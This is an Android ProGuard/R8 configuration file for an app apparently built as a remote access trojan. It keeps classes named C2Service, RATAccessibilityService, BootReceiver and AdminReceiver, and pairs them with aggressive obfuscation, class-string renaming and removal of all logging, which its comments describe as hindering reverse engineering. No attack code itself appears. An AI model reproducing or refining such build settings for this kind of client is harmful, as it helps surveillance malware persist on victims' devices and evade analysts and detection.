# Keep all activities, services, and broadcast receivers, as they are entry points
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.app.backup.BackupAgentHelper
-keep public class * extends android.preference.Preference
-keep public class com.android.vending.licensing.ILicensingService

# Keep native methods
-keepclasseswithmembernames class * {
    native <methods>;
}

# Keep custom views
-keep public class * extends android.view.View {
    public <init>(android.content.Context);
    public <init>(android.content.Context, android.util.AttributeSet);
    public <init>(android.content.Context, android.util.AttributeSet, int);
    public void set*(...);
}

# Keep enums
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# Keep parcelable classes
-keep class * implements android.os.Parcelable {
  public static final android.os.Parcelable$Creator *;
}

# Keep R class members
-keepclassmembers class **.R$* {
    public static <fields>;
}

# Keep our specific services and receivers referenced in the manifest
-keep class com.example.client.MainActivity
-keep class com.example.client.C2Service
-keep class com.example.client.BootReceiver
-keep class com.example.client.AdminReceiver
-keep class com.example.client.RATAccessibilityService

# Keep new security classes but obfuscate methods
-keep class com.example.client.SecureConfig {
    public static getInstance(android.content.Context);
}
-keep class com.example.client.CryptoManager {
    public <init>();
    public void generateNewKey();
    public boolean hasKey();
}
-keep class com.example.client.AuthManager {
    public <init>(android.content.Context);
    public boolean isAuthenticated();
}
-keep class com.example.client.IntegrityValidator {
    public <init>(android.content.Context);
    public com.example.client.IntegrityValidator$SecurityCheckResult performSecurityCheck();
}

# Keep result classes for integrity checks
-keep class com.example.client.IntegrityValidator$SecurityCheckResult {
    public boolean overallSecure;
    public java.lang.String error;
}

# Enhanced obfuscation settings
-overloadaggressively
-repackageclasses 'a'
-allowaccessmodification
-mergeinterfacesaggressively

# String obfuscation - hide sensitive strings
-adaptclassstrings
-adaptresourcefilenames **.xml

# Advanced optimizations
-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*
-optimizationpasses 5

# Keep JSON classes but obfuscate method names where possible
-keep class org.json.** { *; }

# Security: Hide reflection usage
-keepattributes *Annotation*

# Anti-tampering: Make reverse engineering harder
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable

# Hide crypto-related strings
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# Keep SSL/TLS classes for secure communication
-keep class javax.net.ssl.** { *; }
-keep class javax.crypto.** { *; }

# Additional security measures
-dontwarn javax.crypto.**
-dontwarn java.security.**

# Keep BouncyCastle if used
-keep class org.bouncycastle.** { *; }
-dontwarn org.bouncycastle.**

# Android security framework
-keep class androidx.security.crypto.** { *; }

# Root detection library
-keep class com.scottyab.rootbeer.** { *; }
